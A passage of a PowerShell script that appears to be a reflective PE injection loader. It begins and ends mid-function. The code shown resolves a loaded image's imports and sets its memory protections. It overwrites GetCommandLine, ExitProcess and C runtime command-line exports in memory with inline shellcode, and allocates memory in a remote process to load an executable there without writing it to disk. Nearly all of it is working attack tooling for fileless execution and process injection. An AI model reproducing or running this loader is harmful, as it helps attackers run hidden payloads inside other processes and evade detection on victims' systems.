						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $ImportDllPath"
				}
				
				#Get the first thunk, then loop through all of them
				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
					$ProcedureName = ''
					#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					#	and doing the comparison, just see if it is less than 0
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([Int64]$OriginalThunkRefVal -lt 0)
					{
						$ProcedureName = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionName $ProcedureName
					}
					else
					{
						[IntPtr]$NewThunkRef = $Win32Functions.GetProcAddress.Invoke($ImportDllHandle, $ProcedureName)
					}
					
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
						Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		
		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}

		#################################################
		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr"
		}

		#Prepare the shellcode
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		#Make copy of GetCommandLineA and GetCommandLineW
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		#Overwrite GetCommandLineA
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		#Overwrite GetCommandLineW
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		#################################################
		
		
		#################################################
		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		#################################################
		
		
		#################################################
		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		$ReturnArray = @()
		$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		#CorExitProcess (compiled in to visual studio c++)
		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitFunctions += $CorExitProcessAddr
		
		#ExitProcess (what non-managed programs use)
		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			#The following is the shellcode (Shellcode: ExitThread.asm):
			#32bit shellcode
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			#64bit shellcode (Shellcode: ExitThread.asm)
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			#Make copy of original ExitProcess bytes
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
			#	call ExitThread
			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		#################################################

		Write-Output $ReturnArray
	}
	
	
	#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
	#	It copies Count bytes from Source to Destination.
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	#####################################
	##########    FUNCTIONS   ###########
	#####################################
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Get the export table
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			#AddressOfNames is an array of pointers to strings of the names of the functions exported
			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{
				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				#    which contains the offset of the function in to the DLL
				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		#Get basic PE information
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		#Verify that the PE and the current process are the same bits (32bit or 64bit)
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		

		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
		[IntPtr]$LoadAddr = [IntPtr]::Zero
		if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}

		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		if ($RemoteLoading -eq $true)
		{
			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			#todo, error handling needs to delete this memory if an error happens along the way
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		#Now that the PE is in memory, get more detailed information about it
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
